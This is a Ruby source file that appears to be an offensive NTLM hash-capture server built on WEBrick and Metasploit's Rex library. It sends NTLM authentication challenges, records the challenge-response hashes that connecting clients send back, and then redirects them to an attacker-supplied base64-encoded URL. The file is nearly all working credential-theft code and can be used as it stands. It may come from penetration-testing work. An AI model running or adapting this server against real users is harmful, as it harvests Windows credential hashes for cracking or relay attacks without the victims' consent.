require 'webrick'
require 'rex'
require 'securerandom'
require_relative 'utils.rb'
require 'base64'

NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

$dict = {}
$domain = "contoso.local"

def handle_request(request, response)
  if !request.query['value'].nil?
    begin
      qp = request.query['value'].to_s
      redirurl = Base64.decode64(qp).strip()
      response.set_redirect(WEBrick::HTTPStatus::TemporaryRedirect, redirurl)
    rescue
     # puts 'error'
     #Rescue Error... NOPE!
    end
  end
  response.body = "ok"
  response.status = 200
end

class Simple < WEBrick::HTTPServlet::AbstractServlet
  
  def do_GET(request, response)

    if request.header['authorization'].empty?
      response.header['www-authenticate'] = "NTLM"
      response.status = 401
    elsif request.header['authorization'].join().include?('NTLM')
      #Could be multiple http_authorization headers. Just in case iterate over both looking for the NTLM one

      request.header['authorization'].each do |value|
        if value.include?('NTLM')
          hash =  value.split[1]
          message = Rex::Text.decode_base64(hash)
          if !message.nil?
            domain = 'domain'
            server = 'server'
            dom,ws = parse_type1_domain(message)
            if(dom)
              domain = dom
            end
            if(ws)
              server = ws
            end
        
            if (message[8,1] == "\x01")
              chal = SecureRandom.hex(8)
              $dict[request.peeraddr[1]] = chal
              chalhash = MESSAGE.process_type1_message(hash,[$dict[request.peeraddr[1]]].pack("H*"),domain,server,server,$domain, false)
              response.header['WWW-Authenticate'] = "NTLM " + chalhash
              response.status = 401
            elsif (message[8,1] == "\x03")
              process_hash(hash, [$dict[request.peeraddr[1]]].pack("H*"), request.remote_ip())
              request, response = handle_request(request, response)
            end
          end
        end
      end
    end
  end


end

server = WEBrick::HTTPServer.new(:Port => 3333)
server.mount "/", Simple

# Enable shutdown on C-c
trap("INT"){ server.shutdown }
server.start
